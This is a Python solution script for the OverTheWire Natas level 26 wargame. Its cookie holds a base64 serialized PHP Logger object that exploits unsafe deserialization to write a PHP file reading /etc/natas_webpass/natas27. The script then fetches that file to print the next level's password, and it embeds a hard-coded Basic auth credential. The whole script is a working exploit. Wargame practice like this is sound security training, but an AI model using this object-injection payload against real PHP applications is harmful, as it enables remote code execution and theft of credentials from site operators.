

import requests
import copy
import re

proxies = {
    'http' : '127.0.0.1:8080',
    'https' : '127.0.0.1:8080'
}
authorization = 'Basic bmF0YXMyNjpvR2dXQUo3emNHVDI4dllhekdvNHJraE9QRGhCdTM0VA=='

# Create file "/var/www/natas/natas26/img/foobar.php" with content:
# <?php echo file_get_contents("/etc/natas_webpass/natas27"); ?>
cookie_payload = 'YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNzoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvZm9vYmFyLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjc6Iklnbm9yZWQiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MjoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjciKTsgPz4iO319'
r = requests.get(
    'http://natas26.natas.labs.overthewire.org',
    headers = {
        'Host' : 'natas26.natas.labs.overthewire.org',
        'Authorization' : authorization
    },
    cookies={
        # base64. Leave the URL encoding to the requests library
        'drawing' : cookie_payload
    },
    proxies=proxies
)
assert(r.status_code != 401)

# Issue a GET request to "img/foobar.php" in order to to execute our payload
r = requests.get(
    'http://natas26.natas.labs.overthewire.org/img/foobar.php',
    headers = {
        'Host' : 'natas26.natas.labs.overthewire.org',
        'Authorization' : authorization
    },
    proxies=proxies
)

if r.ok:
    print("Credentials found!")
    match = re.search(r'^([a-zA-Z0-9]+).*', r.text)
    if match:    
        print("")
        print("Credentials for Natas level27")
        print("UN: natas27")
        print("PW: " + match.groups()[0])
        print("")
else:
    assert(False and 'Exploit is 100% reliable')
